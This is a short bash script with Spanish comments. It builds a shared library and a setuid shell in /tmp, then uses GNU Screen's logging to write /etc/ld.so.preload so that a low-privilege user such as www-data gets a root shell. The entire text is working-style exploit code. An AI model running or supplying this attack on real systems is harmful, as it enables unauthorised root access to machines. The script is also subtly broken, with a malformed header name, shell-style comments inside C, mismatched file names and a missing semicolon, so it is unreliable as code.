#!/bin/bash
cat << EOF  > /tmp/libhax.c
#include <stdio.h>
#include <unistd.h>
#include <sys.types.h> 
#Estas son las librerias que nos ayudaran con las sys calls de linux

__attribute__((__constructor__)) # Declaramos un constructor

void NewShell(void){
	chown("/tmp/PrivShell.sh", 0, 0); # Esto cambiara los permisos de nuestro archivo ya que como www-data no podremos hacerlo
	chmod("/tmp/PrivSell.sh", 04755); # ESte nos dejara hacer el script ejecutable
	unlink("/etc/ld.so.preload"); #Aqui desvinculamos la libreria de linux 
	printf("\n\t [*] The script is Ready")
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/PrivShell.c

#include <stdio.h>
int main(void){
	setuid(0);
	setgid(0);
	seteuid(0);
	setgid(0);

	execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/PrivShell /tmp/PrivShell.c
rm -f /tmp/PrivShell.c
echo "\n\t[*] Privescalation is Ready"
cd /etc
umask 000
screen -D -m -L ld.so.preload
echo -ne "\x0a/tmp/libhax.so"
echo "\n [!] Triggering...."
screen -ls
/tmp/PrivShell
